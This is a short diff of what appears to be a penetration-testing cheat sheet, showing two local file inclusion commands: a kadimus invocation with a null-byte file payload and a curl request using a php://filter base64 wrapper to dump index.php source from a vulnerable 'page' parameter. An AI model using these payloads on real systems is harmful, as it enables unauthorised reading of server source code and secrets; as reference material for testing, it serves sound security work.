@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:19.778116+00:00'
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
+
+
